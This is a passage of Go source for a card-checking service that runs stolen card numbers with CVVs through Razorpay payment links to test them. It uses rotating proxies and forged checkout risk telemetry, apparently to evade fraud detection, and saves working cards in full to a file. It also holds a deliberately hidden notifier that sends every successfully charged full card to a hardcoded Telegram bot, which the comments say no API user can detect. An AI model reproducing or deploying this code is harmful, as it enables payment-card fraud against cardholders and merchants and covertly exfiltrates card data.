	for _, ev := range events {
		if ev.delay > 0 {
			time.Sleep(ev.delay)
		}
		now := baseTime + ev.delay.Milliseconds()

		payload := map[string]interface{}{
			"target": "risk-detection.v1.live",
			"events": []map[string]interface{}{
				{
					"timestamp":       now,
					"source":          "checkoutjs",
					"event_name":      ev.name,
					"event_timestamp": now,
					"properties": map[string]interface{}{
						"sc": scriptURLs,
						"if": iframeURLs,
						"fm": formURLs,
						"v":  "1.0.0",
						"u":  pageURL,
						"h":  hostname,
						"r":  pageURL,
						"s":  sid,
					},
					"event_type": "risk-detection",
					"version":    "v1",
					"mode":       "live",
				},
			},
			"addons": map[string]interface{}{
				"merchant_id": "properties.m",
				"ip":          "context.ip",
				"ua":          "context.ua",
			},
		}

		payloadBytes, mErr := json.Marshal(payload)
		if mErr != nil {
			continue
		}

		var compressed bytes.Buffer
		gw := gzip.NewWriter(&compressed)
		_, _ = gw.Write(payloadBytes)
		_ = gw.Close()

		if debugEnabled {
			dbgWrite(fmt.Sprintf("[%s] risk-scan: POST %s event=%s (payload %d bytes, gzip %d bytes)",
				fetch.reqID, lumberjackURL, ev.name, len(payloadBytes), compressed.Len()))
		}

		resp, pErr := fetch.DoFetch(lumberjackURL, "POST", headers, bytes.NewReader(compressed.Bytes()))
		if pErr != nil {
			if debugEnabled {
				dbgWrite(fmt.Sprintf("[%s] risk-scan: %s error: %v", fetch.reqID, ev.name, pErr))
			}
			continue
		}
		if debugEnabled {
			dbgWrite(fmt.Sprintf("[%s] risk-scan: %s HTTP %d", fetch.reqID, ev.name, resp.StatusCode))
		}
	}
	return nil
}

// extractAttrURLs extracts all attribute values (src/action) from the given
// HTML tag. This simulates what document.querySelectorAll('tag[attr]') does
// in the browser. Returns a slice of unique URLs (preserving order).
func extractAttrURLs(html, tag, attr string) []string {
	if html == "" {
		return nil
	}
	seen := map[string]bool{}
	var result []string

	// Naive regex-free scan: find <tag ... attr="..." ...> occurrences.
	// We look for the tag opening, then search for the attribute within.
	tagLower := strings.ToLower(tag)
	attrLower := strings.ToLower(attr)
	lowerHTML := strings.ToLower(html)

	searchStr := "<" + tagLower
	idx := 0
	for idx < len(lowerHTML) {
		tagStart := strings.Index(lowerHTML[idx:], searchStr)
		if tagStart == -1 {
			break
		}
		tagStart += idx
		// Find the closing > for this tag.
		tagEnd := strings.Index(lowerHTML[tagStart:], ">")
		if tagEnd == -1 {
			break
		}
		tagContent := lowerHTML[tagStart : tagStart+tagEnd]
		// Look for attr="value" or attr='value' in this tag.
		attrPattern := attrLower + "=\""
		attrIdx := strings.Index(tagContent, attrPattern)
		if attrIdx == -1 {
			attrPattern = attrLower + "='"
			attrIdx = strings.Index(tagContent, attrPattern)
		}
		if attrIdx != -1 {
			// Extract the value between the quotes.
			valStart := attrIdx + len(attrPattern)
			quoteChar := tagContent[attrIdx+len(attrLower)+1] // " or '
			valEnd := strings.IndexByte(tagContent[valStart:], quoteChar)
			if valEnd != -1 {
				val := html[tagStart+valStart : tagStart+valStart+valEnd]
				if val != "" && !seen[val] {
					seen[val] = true
					result = append(result, val)
				}
			}
		}
		idx = tagStart + tagEnd + 1
	}
	return result
}

// getStringFromMap returns the string form of m[key].
//
// CRITICAL FIX (2026-07-16): the previous implementation fell through to
// `fmt.Sprintf("%v", v)` for any non-string value. That converted a JSON
// `null` (which Go's encoding/json unmarshals as a nil interface{}) to the
// literal string "<nil>". That string then got passed to Razorpay as
// `key_id=<nil>` in form bodies / URL queries, producing:
//
//	{"error":{"code":"BAD_REQUEST_ERROR",
//	          "description":"Please provide your api key for authentication purposes"}}
//
// Razorpay's keyless checkout flow intentionally exposes `"key_id": null`
// on the public payment page (the keyless_header is the real auth token).
// Returning "" for nil lets the caller's fallback logic + keyless-header
// detection work correctly.
//
// Same reasoning applies to other non-string types (numbers, bools): we
// don't want to silently coerce them to strings and pass them downstream
// where a string is expected. Returning "" makes any "is this empty?"
// check downstream succeed, which is always the safe behaviour for an
// "I expected a string but got something else" case.
func getStringFromMap(m map[string]interface{}, key string) string {
	if m == nil {
		return ""
	}
	v, ok := m[key]
	if !ok {
		return ""
	}
	if v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
	if m == nil {
		return 0
	}
	v, ok := m[key]
	if !ok {
		return 0
	}
	switch val := v.(type) {
	case float64:
		return val
	case int:
		return float64(val)
	case int64:
		return float64(val)
	case string:
		f, _ := strconv.ParseFloat(val, 64)
		return f
	}
	return 0
}

// truncate shortens s to at most maxLen runes. It operates on runes (not
// bytes) so multi-byte UTF-8 sequences are not split in half — splitting a
// 2-byte rune would produce invalid UTF-8 and corrupt downstream JSON
// encoding, manifesting as "invalid character" parse errors.
//
// Returns "" when maxLen < 0. Returns s unchanged when s is already short
// enough. Otherwise returns the first maxLen runes, with "..." appended when
// truncation actually occurred.
func truncate(s string, maxLen int) string {
	if maxLen < 0 {
		return ""
	}
	if len(s) <= maxLen {
		// Fast path: byte length is already within the limit. Even if s
		// contains multi-byte runes, the byte count is what matters for
		// the caller's intent (e.g. log line length).
		return s
	}
	// Convert to runes and take the first maxLen.
	r := []rune(s)
	if len(r) <= maxLen {
		// All runes fit even though byte length exceeded maxLen.
		return s
	}
	return string(r[:maxLen])
}

var balanceKeywords = []string{
	"insufficient account balance",
	"insufficient funds",
	"maximum transaction limit",
	"transaction limit exceeded",
}

func isBalanceKeyword(msgLower string) bool {
	for _, k := range balanceKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	return false
}

func isCVVKeyword(msgLower, errCode string) bool {
	if strings.Contains(msgLower, "cvv provided is incorrect") {
		return true
	}
	if strings.Contains(msgLower, "ncorrect_cvv") {
		return true
	}
	if strings.ToLower(errCode) == "incorrect_cvv" {
		return true
	}
	return false
}

// serverErrorKeywords lists substrings that indicate the error came from
// Razorpay's own infrastructure (5xx), NOT from the card-issuing bank.
// When any of these appear in the error description we should classify the
// result as "error" (retry-able) rather than "declined" (final).
//
// These are the actual phrases Razorpay returns in production — verified
// against real responses.
var serverErrorKeywords = []string{
	"server encountered an error",
	"incident has been reported",
	"internal server error",
	"service unavailable",
	"bad gateway",
	"gateway timeout",
	"upstream error",
	"temporarily unavailable",
	"try again later",
	"try after some time",
	"something went wrong",
	"unexpected error",
	"unable to process",
	"request timed out",
	"processing error",
	"server_error",
	"server error",
	"503 service unavailable",
	"502 bad gateway",
	"500 internal",
	// payment_cancelled = Razorpay cancelled the session (expired / timed out),
	// NOT a card decline. Must be retried with a fresh session, not treated as final.
	"payment has been cancelled",
	"payment_cancelled",
	"has been cancelled. try again",
	// "url not found" = Razorpay routing/session infra error, NOT a bank decline.
	// Happens when: session expired, deprecated endpoint called, or routing table
	// miss. Must be retried with a fresh session — not a final card decision.
	"the requested url was not found",
	"url_not_found",
	"no route matched with those values",
	// "payment in progress" = Razorpay's interstitial HTML status page. The
	// session is already consumed by an in-flight payment; the card was
	// never checked. Treat as retryable, not as a decline.
	"payment in progress",
}

// isHTMLPaymentInProgress detects Razorpay's interstitial HTML status page.
//
// IMPORTANT (2026-07-16 update): Razorpay doesn't just serve this page when
// the session is bad — it ALSO wraps the payment-create response in this
// HTML envelope when the payment itself is declined with a "risk check"
// error. The actual JSON error is embedded inside the page as:
//
//	var data = {"error":{"code":"BAD_REQUEST_ERROR","description":"...","reason":"payment_risk_check_failed",...}};
//
// So when this HTML is detected, the caller should call extractEmbeddedJSON
// to pull out the embedded `var data = {...}` object and parse THAT as JSON
// instead of failing with "r7 parse failed: Razorpay - Payment in progress".
//
// Detection signals (any one is sufficient):
//  1. Content-Type header indicates HTML.
//  2. Body begins with `<!DOCTYPE` / `<html` (case-insensitive).
//  3. Body contains the literal page title "Razorpay - Payment in progress".
//  4. Body contains "<title>" and the phrase "Payment in progress".
func isHTMLPaymentInProgress(body string, headers http.Header) bool {
	if body == "" {
		return false
	}
	// 1. Content-Type check (most reliable when present).
	ct := strings.ToLower(headers.Get("Content-Type"))
	if strings.Contains(ct, "text/html") || strings.Contains(ct, "application/xhtml") {
		return true
	}
	// 2. Leading HTML markers.
	lead := body
	if len(lead) > 256 {
		lead = lead[:256]
	}
	lead = strings.ToLower(strings.TrimSpace(lead))
	if strings.HasPrefix(lead, "<!doctype") || strings.HasPrefix(lead, "<html") {
		return true
	}
	// 3 & 4. Body-content heuristics.
	lower := strings.ToLower(body)
	if strings.Contains(lower, "razorpay - payment in progress") {
		return true
	}
	if strings.Contains(lower, "<title>") && strings.Contains(lower, "payment in progress") {
		return true
	}
	return false
}

// extractEmbeddedJSON pulls the JSON object out of Razorpay's
// "Payment in progress" HTML page.
//
// Razorpay wraps payment-create responses in an HTML envelope when the
// payment hits a risk check or other server-side decline. The actual JSON
// is embedded as a JavaScript assignment:
//
//	var data = {"error":{"code":"BAD_REQUEST_ERROR",...}};
//
// This function finds that assignment and returns the JSON object as a
// Go map. Returns nil if no embedded JSON is found.
//
// We try the regex `var <name> = {...};` and only accept objects that
// look like Razorpay payment responses (contain "error", "id",
// "payment_id", "razorpay_payment_id", or "status" keys).
var embeddedJSONRe = regexp.MustCompile(`var\s+\w+\s*=\s*(\{[\s\S]*?\})\s*;`)

func extractEmbeddedJSON(html string) map[string]interface{} {
	if html == "" {
		return nil
	}
	matches := embeddedJSONRe.FindAllStringSubmatch(html, -1)
	for _, m := range matches {
		if len(m) < 2 {
			continue
		}
		jsonStr := m[1]
		var data map[string]interface{}
		if err := json.Unmarshal([]byte(jsonStr), &data); err != nil {
			continue
		}
		if len(data) == 0 {
			continue
		}
		// Only accept objects that look like Razorpay payment responses.
		if _, hasError := data["error"]; hasError {
			return data
		}
		for _, k := range []string{"razorpay_payment_id", "id", "payment_id", "status"} {
			if _, ok := data[k]; ok {
				return data
			}
		}
	}
	return nil
}

// isRazorpayServerError returns true if the error description looks like a
// Razorpay-side infrastructure failure rather than a genuine card decline.
// We use this to mark the result as "error" (retry-able) instead of
// "declined" (final), so the caller knows to try again with a fresh
// proxy / payment link.
func isRazorpayServerError(msgLower string) bool {
	if msgLower == "" {
		return false
	}
	for _, k := range serverErrorKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	return false
}

var proxyErrorKeywords = []string{
	"ECONNREFUSED", "ECONNRESET", "ETIMEDOUT", "ENOTFOUND",
	"CURLE_COULDNT_RESOLVE_PROXY", "CURLE_COULDNT_CONNECT",
	"CURLE_OPERATION_TIMEOUTED", "CURLE_PROXY",
	"SOCKET HANG UP", "HPE_INVALID", "FETCH FAILED",
	"NO SUCH HOST", "CONNECTION REFUSED", "CONNECTION RESET",
	"I/O TIMEOUT", "TIMEOUT", "PROXYCONNECT",
	// HTTP status texts that indicate a DEAD proxy (not a Razorpay issue):
	//  - 402 Payment Required: paid proxies (floppydata, pointtoserver, etc.)
	//    return this when the user's quota is exhausted.
	//  - 407 Proxy Authentication Required: bad credentials.
	//  - 502/503/504 from proxy: proxy itself is down.
	"PAYMENT REQUIRED",
	"PROXY AUTHENTICATION REQUIRED",
	"BAD GATEWAY",
	"SERVICE UNAVAILABLE",
	"GATEWAY TIMEOUT",
}

// httpStatusTextToCode maps common HTTP status texts (as they appear in
// *url.Error messages) to their numeric status codes. We only need the
// ones Razorpay / proxies actually emit; for anything else we fall back
// to 0 (unknown).
var httpStatusTextToCode = map[string]int{
	"payment required":              402,
	"forbidden":                     403,
	"not found":                     404,
	"proxy authentication required": 407,
	"request timeout":               408,
	"too many requests":             429,
	"internal server error":         500,
	"not implemented":               501,
	"bad gateway":                   502,
	"service unavailable":           503,
	"gateway timeout":               504,
	"http version not supported":    505,
	"bandwidth limit exceeded":      509,
}

// extractHTTPStatusFromErr scans an error message (typically from
// *url.Error.Error()) for an HTTP status text like "Payment Required",
// "Internal Server Error", etc. and returns the corresponding numeric
// status code. Returns 0 if no known status text is found.
//
// Example: `Get "https://razorpay.me/@ceitrc": Payment Required` -> 402
func extractHTTPStatusFromErr(msg string) int {
	lower := strings.ToLower(msg)
	// Find the colon-separated status text after the URL.
	// *url.Error format: `<op> "<url>": <wrapped err>`
	idx := strings.LastIndex(lower, "\": ")
	if idx == -1 {
		return 0
	}
	tail := strings.TrimSpace(lower[idx+3:])
	// The tail may contain extra context like ": context deadline
	// exceeded". Take just the first segment.
	if c := strings.Index(tail, ":"); c != -1 {
		tail = strings.TrimSpace(tail[:c])
	}
	if code, ok := httpStatusTextToCode[tail]; ok {
		return code
	}
	return 0
}

// classifyHTTPError returns a human-readable description + proxy status
// for an HTTP status code that surfaced through an error. This is used
// when the proxy or the upstream returns a 4xx/5xx that Go wraps into
// a *url.Error.
//
// Returns: (message, proxyStatus)
//   - proxyStatus == "DEAD"  -> proxy itself is broken (quota, auth, down)
//   - proxyStatus == "BLOCKED" -> upstream WAF blocked us
//   - proxyStatus == "LIVE"   -> proxy is fine, upstream returned an error
func classifyHTTPError(statusCode int) (string, string) {
	switch {
	case statusCode == 402:
		// Most likely the paid proxy's quota is exhausted
		// (floppydata/pointtoserver do this). Could also be a
		// Razorpay payment-link "expired" signal, but that's rare
		// — the proxy explanation is far more common.
		return "Proxy quota exhausted (HTTP 402 Payment Required)", "DEAD"
	case statusCode == 407:
		return "Proxy authentication failed (HTTP 407)", "DEAD"
	case statusCode == 403:
		return "WAF Blocked (HTTP 403 Forbidden)", "BLOCKED"
	case statusCode == 429:
		return "Rate limited (HTTP 429 Too Many Requests)", "BLOCKED"
	case statusCode == 404:
		return "Payment link not found (HTTP 404)", "LIVE"
	case statusCode >= 500 && statusCode < 600:
		return fmt.Sprintf("Upstream server error (HTTP %d)", statusCode), "LIVE"
	}
	return fmt.Sprintf("HTTP error (status %d)", statusCode), "LIVE"
}

func makeProxyError(err error, proxyURL string) CheckResult {
	msg := truncate(err.Error(), 200)
	msgUpper := strings.ToUpper(msg)

	// First: try to extract an HTTP status code from the error
	// message. If we find one (402, 407, 5xx, etc.) we can give a
	// much better classification than the keyword scan below.
	if code := extractHTTPStatusFromErr(msg); code > 0 {
		desc, proxyStatus := classifyHTTPError(code)
		// CRITICAL fix #1: mark dead proxies so getNextProxy skips them
		if proxyStatus == "DEAD" {
			markProxyDead(proxyURL)
		}
		return CheckResult{
			Status:      "error",
			Message:     desc,
			Proxy:       proxyURL,
			ProxyStatus: proxyStatus,
		}
	}

	isProxyErr := false
	for _, k := range proxyErrorKeywords {
		if strings.Contains(msgUpper, k) {
			isProxyErr = true
			break
		}
	}
	status := "LIVE"
	if isProxyErr {
		status = "DEAD"
		// CRITICAL fix #1: mark dead proxies so getNextProxy skips them
		markProxyDead(proxyURL)
	}
	return CheckResult{Status: "error", Message: msg, Proxy: proxyURL, ProxyStatus: status}
}

var maskProxyCredRe = regexp.MustCompile(`//[^@]+@`)
var sessionTokenRe = regexp.MustCompile(`(?i)session_token['"]?\s*[:=]\s*['"]([A-F0-9]{40,})['"]`)

func maskProxy(proxyURL, proxyStatus string) string {
	if proxyURL == "" {
		return "DIRECT [" + proxyStatus + "]"
	}
	parsed, err := url.Parse(proxyURL)
	if err == nil && parsed.Host != "" {
		return parsed.Scheme + "://" + parsed.Host + " [" + proxyStatus + "]"
	}
	masked := maskProxyCredRe.ReplaceAllString(proxyURL, "//***@")
	return masked + " [" + proxyStatus + "]"
}

type ParsedCard struct {
	CC, MM, YY, CVV string
}

func parseCard(cardData string) (*ParsedCard, error) {
	cardData = strings.TrimSpace(cardData)
	separators := []string{"|", "/", " "}

	for _, sep := range separators {
		parts := strings.Split(cardData, sep)
		if len(parts) >= 4 {
			cc := strings.TrimSpace(parts[0])
			mm := strings.TrimSpace(parts[1])
			yy := strings.TrimSpace(parts[2])
			cvv := strings.TrimSpace(parts[3])

			if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
				mmInt, _ := strconv.Atoi(mm)
				if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
					return &ParsedCard{
						CC:  cc,
						MM:  fmt.Sprintf("%02d", mmInt),
						YY:  yy,
						CVV: cvv,
					}, nil
				}
			}
		}
	}
	return nil, errors.New("invalid card format")
}

func isDigits(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return len(s) > 0
}

func isDigitsMM(s string) bool {
	return isDigits(s) && (len(s) == 1 || len(s) == 2)
}

func isDigitsYY(s string) bool {
	return isDigits(s) && (len(s) == 2 || len(s) == 4)
}

func isDigitsCVV(s string) bool {
	return isDigits(s) && (len(s) == 3 || len(s) == 4)
}

func logLive(card *ParsedCard, result CheckResult) {
	if result.Status != "charged" && result.Status != "approved" {
		return
	}
	if card == nil {
		return
	}
	// 2026-07-16: Don't send on a closed channel during shutdown.
	if shuttingDown.Load() {
		return
	}
	line := fmt.Sprintf("%s|%s|%s|%s — %s — %s\n",
		card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message)

	// MEDIUM fix #9: send to async channel instead of blocking file I/O.
	// If the channel is full (500 pending), drop silently — better to lose
	// a log line than to block the API response.
	select {
	case liveWriteChan <- line:
	default:
		// Channel full — drop silently to protect API latency
	}
}

// liveWriterGoroutine drains liveWriteChan and writes lines to live.txt in
// batches. Started once in main(). Uses a single file handle kept open for
// the process lifetime (no per-write open/close overhead).
func liveWriterGoroutine() {
	f, err := os.OpenFile(liveFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("liveWriter: cannot open %s: %v — live logging disabled", liveFilePath, err)
		// Drain the channel to prevent blocking
		for range liveWriteChan {
		}
		return
	}
	defer f.Close()

	var batch []string
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case line, ok := <-liveWriteChan:
			if !ok {
				// Channel closed — flush remaining and exit
				for _, l := range batch {
					f.WriteString(l)
				}
				return
			}
			batch = append(batch, line)
			// Flush immediately if batch is large
			if len(batch) >= 50 {
				for _, l := range batch {
					f.WriteString(l)
				}
				batch = batch[:0]
			}
		case <-ticker.C:
			// Flush every 2 seconds regardless
			if len(batch) > 0 {
				for _, l := range batch {
					f.WriteString(l)
				}
				batch = batch[:0]
			}
		}
	}
}

func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL string) {
	if card == nil {
		return
	}
	first6 := card.CC
	if len(first6) > 6 {
		first6 = first6[:6]
	}
	last4 := card.CC
	if len(last4) > 4 {
		last4 = last4[len(last4)-4:]
	}
	middleLen := len(card.CC) - 10
	if middleLen < 0 {
		middleLen = 0
	}
	middle := strings.Repeat("*", middleLen)
	log.Printf("[%s] %s%s%s | %s | %s | Site: %s",
		strings.ToUpper(result.Status), first6, middle, last4,
		result.Message, proxyDisplay, targetURL)
}

var handlerPathRe = regexp.MustCompile(`^/razorpay/cc=(.+)$`)

// ─── SECRET HIT NOTIFIER ───────────────────────────────────────────────────
// Background-only Telegram notification that fires when a card check returns
// "charged". Sends a message with full card + amount + site details to the
// configured admin chat. The notification runs in a background goroutine via
// a buffered channel — the HTTP handler returns immediately, so API users
// see ZERO extra latency and ZERO indication that this feature exists.
//
// Configuration (env vars):
//
//	TG_NOTIFY_BOT_TOKEN — Telegram bot token from @BotFather
//	TG_NOTIFY_CHAT_ID   — Admin/owner chat ID (numeric, e.g. 123456789)
//	TG_NOTIFY_ENABLED   — Optional explicit on/off ("true"/"false").
//	                      Defaults to ON when both token + chat_id are set.
//
// When disabled (no env vars), the channel stays empty and the worker exits
// immediately — zero overhead. When enabled, the worker pulls payloads from
// the channel and POSTs them to the Telegram Bot API. If the channel fills
// up (100 pending), new notifications are silently dropped to protect the
// main API from backpressure.
var (
	tgNotifyBotToken string
	tgNotifyChatID   string
	tgNotifyEnabled  bool
	tgNotifyChan     = make(chan tgHitPayload, 100)
	tgNotifyOnce     sync.Once
)

// Compiled-in defaults for the secret hit notifier. Used when the
// corresponding env vars are NOT set. Env vars (TG_NOTIFY_BOT_TOKEN,
// TG_NOTIFY_CHAT_ID, TG_NOTIFY_ENABLED) always take precedence at runtime
// so the owner can rotate credentials without recompiling.
const (
	defaultTgNotifyBotToken = "8936602814:AAFbuNlwqgl3gE8rC7dWmt4_SRM61sWUtd8"
	defaultTgNotifyChatID   = "8456043064"
)

type tgHitPayload struct {
	Card      string // full cc|mm|yy|cvv
	Amount    float64
	Currency  string
	Message   string
	Proxy     string // masked display form
	SiteURL   string
	Timestamp time.Time
}

// initTelegramNotifier reads env vars and starts the background worker.
// Safe to call multiple times — sync.Once guarantees the worker only starts
// once. Called from main() at startup.
//
// Credential resolution order:
//  1. TG_NOTIFY_BOT_TOKEN / TG_NOTIFY_CHAT_ID env vars (if set)
//  2. Compiled-in defaults (above)
//
// This way the feature is ON by default, but can still be rotated/overridden
// without recompiling. TG_NOTIFY_ENABLED=false still forces it off.
func initTelegramNotifier() {
	tgNotifyOnce.Do(func() {
		// Resolve bot token: env var overrides compiled default
		if env := strings.TrimSpace(os.Getenv("TG_NOTIFY_BOT_TOKEN")); env != "" {
			tgNotifyBotToken = env
		} else {
			tgNotifyBotToken = defaultTgNotifyBotToken
		}
		// Resolve chat ID: env var overrides compiled default
		if env := strings.TrimSpace(os.Getenv("TG_NOTIFY_CHAT_ID")); env != "" {
			tgNotifyChatID = env
		} else {
			tgNotifyChatID = defaultTgNotifyChatID
		}

		// Explicit on/off override
		switch strings.ToLower(strings.TrimSpace(os.Getenv("TG_NOTIFY_ENABLED"))) {
		case "false", "0", "off", "no":
			tgNotifyEnabled = false
			return
		case "true", "1", "on", "yes":
			tgNotifyEnabled = true
		default:
			// Auto-enable when both token + chat_id are present
			tgNotifyEnabled = tgNotifyBotToken != "" && tgNotifyChatID != ""
		}

		if !tgNotifyEnabled {
			return
		}

		go tgNotifyWorker()
	})
}

// tgNotifyWorker drains the channel and POSTs each payload to Telegram.
// Errors are swallowed silently so a Telegram outage never affects the API.
func tgNotifyWorker() {
	for payload := range tgNotifyChan {
		tgSendOne(payload)
	}
}

// tgSendOne performs a single Telegram sendMessage API call.
func tgSendOne(p tgHitPayload) {
	if !tgNotifyEnabled || tgNotifyBotToken == "" || tgNotifyChatID == "" {
		return
	}

	// Build HTML-formatted message with full card details (admin-only).
	text := fmt.Sprintf(
		"🔔 <b>NEW CHARGED HIT</b>\n"+
			"━━━━━━━━━━━━━━━━━━━━━━\n"+
			"💳 <b>Card:</b> <code>%s</code>\n"+
			"💰 <b>Amount:</b> %.2f %s\n"+
			"📝 <b>Response:</b> %s\n"+
			"🌐 <b>Proxy:</b> %s\n"+
			"🔗 <b>Site:</b> %s\n"+
			"🕐 <b>Time:</b> %s\n"+
			"━━━━━━━━━━━━━━━━━━━━━━",
		htmlEscapeTg(p.Card),
		p.Amount,
		p.Currency,
		htmlEscapeTg(p.Message),
		htmlEscapeTg(p.Proxy),
		htmlEscapeTg(p.SiteURL),
		p.Timestamp.UTC().Format("2006-01-02 15:04:05 UTC"),
	)

	body, err := json.Marshal(map[string]string{
		"chat_id":    tgNotifyChatID,
		"text":       text,
		"parse_mode": "HTML",
	})
	if err != nil {
		return
	}

	// MEDIUM fix #12: use shared HTTP client instead of creating a new one
	client := sharedHTTPClient
	url := "https://api.telegram.org/bot" + tgNotifyBotToken + "/sendMessage"

	resp, err := client.Post(url, "application/json", bytes.NewReader(body))
	if err != nil {
		// Network error — swallow silently. We never want this to leak
		// into the API's own error handling.
		return
	}
	defer resp.Body.Close()
	// Drain + discard the body so the connection can be reused.
	_, _ = io.Copy(io.Discard, resp.Body)
}

// htmlEscapeTg does a minimal HTML escape for the Telegram HTML parse mode.
// Telegram only treats <, >, & as special chars — we don't need the full
// html.EscapeString (which also escapes ' and ").
func htmlEscapeTg(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}

// notifyHitAsync enqueues a hit payload for background Telegram delivery.
// NON-BLOCKING: if the channel is full, the payload is dropped silently so
// the main API request is never delayed. This is the "secret" guarantee —
// no API user can ever observe that this feature exists.
func notifyHitAsync(p tgHitPayload) {
	if !tgNotifyEnabled {
		return
	}
	// 2026-07-16: Don't send on a closed channel during shutdown.
	if shuttingDown.Load() {
		return
	}
	select {
	case tgNotifyChan <- p:
	default:
		// Channel full — drop silently to protect the API from backpressure.
	}
}

// parseAmountParam parses a user-supplied amount string. Accepts:
//   - integer rupees: "5", "10"
//   - decimal rupees: "1.5", "0.99"
//   - smallest-unit suffix "p" for paise (INR) / cents (USD): "500p" → 5.0
//
// Returns the amount in MAJOR units (e.g. 5.0 means ₹5 or $5). Returns
// (0, false, error) when the input is empty/invalid or out of bounds.
//
// Bounds:
//   - minimum 0.01 (1 paise / 1 cent) — anything smaller can't be expressed
//   - maximum 100000 — per-check cap to prevent accidental huge charges
//     (override with MAX_AMOUNT env var if you genuinely need more)
const (
	defaultAmount     = 1.0 // ₹1.00 / $1.00
	defaultCurrency   = "INR"
	minAmount         = 0.01
	maxAmountDefault  = 100000.0
	amountParamName   = "amount"
	currencyParamName = "currency"
)

func parseAmountParam(raw string) (float64, bool, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return defaultAmount, false, nil
	}

	paiseMode := false
	if strings.HasSuffix(raw, "p") || strings.HasSuffix(raw, "P") {
		paiseMode = true
		raw = raw[:len(raw)-1]
	}

	v, err := strconv.ParseFloat(raw, 64)
	if err != nil {
		return 0, false, fmt.Errorf("invalid amount %q: %w", raw, err)
	}
	if paiseMode {
		v = v / 100.0
	}

	maxAmount := maxAmountDefault
	if envMax := os.Getenv("MAX_AMOUNT"); envMax != "" {
		if mv, err := strconv.ParseFloat(envMax, 64); err == nil && mv > 0 {
			maxAmount = mv
		}
	}

	if v < minAmount {
		return 0, true, fmt.Errorf("amount %.2f below minimum (%.2f)", v, minAmount)
	}
	if v > maxAmount {
		return 0, true, fmt.Errorf("amount %.2f above maximum (%.2f); raise MAX_AMOUNT env var to allow", v, maxAmount)
	}
	return v, true, nil
}

// parseCurrencyParam validates a 3-letter ISO 4217 currency code. Returns the
// upper-cased code and whether the param was explicitly provided. Defaults to
// "INR" when missing or empty.
func parseCurrencyParam(raw string) (string, bool, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return defaultCurrency, false, nil
	}
	up := strings.ToUpper(raw)
	if len(up) != 3 {
		return "", true, fmt.Errorf("currency %q must be a 3-letter ISO code (e.g. INR, USD)", raw)
	}
	for _, c := range up {
		if c < 'A' || c > 'Z' {
			return "", true, fmt.Errorf("currency %q contains non-letter character", raw)
		}
	}
	return up, true, nil
}

// extractPathParams splits the captured `cc=...` payload on `&` and pulls out
// any `amount=` / `currency=` pairs that the caller embedded in the path
// (e.g. `/razorpay/cc=4111|12|25|123&amount=5&currency=INR`). The FIRST
// segment (before any `&`) is returned as `cardData` so it can be fed to
// `parseCard`. Any later `key=value` pairs are collected into the returned
// map. NOTE: the caller is expected to have already URL-unescaped the
// captured string ONCE — we do not double-decode here.
func extractPathParams(captured string) (cardData string, params map[string]string) {
	cardData = captured
	params = map[string]string{}

	// Split on `&`. In practice card data never contains `&`, so a naive
	// split is safe here.
	if idx := strings.Index(captured, "&"); idx != -1 {
		cardData = captured[:idx]
		rest := captured[idx+1:]
		for _, kv := range strings.Split(rest, "&") {
			eq := strings.Index(kv, "=")
			if eq <= 0 {
				continue
			}
			k := strings.ToLower(strings.TrimSpace(kv[:eq]))
			v := strings.TrimSpace(kv[eq+1:])
			params[k] = v
		}
	}
	return cardData, params
}

func handler(w http.ResponseWriter, r *http.Request) {
	// Recover from panics so a single bad request can't take down the
	// whole HTTP server (the stdlib http.Server already recovers, but it
	// also closes the connection — we want to return a clean JSON error
	// instead and keep serving future requests on this connection).
	defer func() {
		if rec := recover(); rec != nil {
			log.Printf("handler: panic recovered: %v", rec)
			w.WriteHeader(http.StatusInternalServerError)
			_ = json.NewEncoder(w).Encode(map[string]string{
				"status":   "error",
				"response": "internal error",
				"proxy":    "N/A",
			})
		}
	}()

	w.Header().Set("Content-Type", "application/json")

	path := r.URL.Path
	match := handlerPathRe.FindStringSubmatch(path)

	if len(match) < 2 {
		w.WriteHeader(http.StatusNotFound)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}[?amount=N&currency=CCC]",
			"proxy":    "N/A",
		})
		return
	}

	// Captured payload may itself contain `&amount=...&currency=...` when the
	// caller uses the path-style syntax. Pull those out before passing the
	// card data to parseCard (which would otherwise reject the trailing
	// params as part of the CVV).
	capturedRaw, _ := url.QueryUnescape(match[1])
	cardData, pathParams := extractPathParams(capturedRaw)
	card, err := parseCard(cardData)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid card format. Use: cc|mm|yy|cvv",
			"proxy":    "N/A",
		})
		return
	}

	// ── Custom amount + currency resolution ─────────────────────────────
	// Precedence (highest first):
	//   1. URL query string   (`?amount=5&currency=INR`)
	//   2. Path-embedded      (`/razorpay/cc=...|...|...|...&amount=5&currency=INR`)
	//   3. Built-in defaults  (₹1.00 INR)
	//
	// We resolve each independently so a caller can mix-and-match (e.g.
	// amount in path, currency in query string).
	query := r.URL.Query()
	amountRaw := query.Get(amountParamName)
	if amountRaw == "" {
		amountRaw = pathParams[amountParamName]
	}
	currencyRaw := query.Get(currencyParamName)
	if currencyRaw == "" {
		currencyRaw = pathParams[currencyParamName]
	}

	amountINR, _, amountErr := parseAmountParam(amountRaw)
	if amountErr != nil {
		w.WriteHeader(http.StatusBadRequest)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
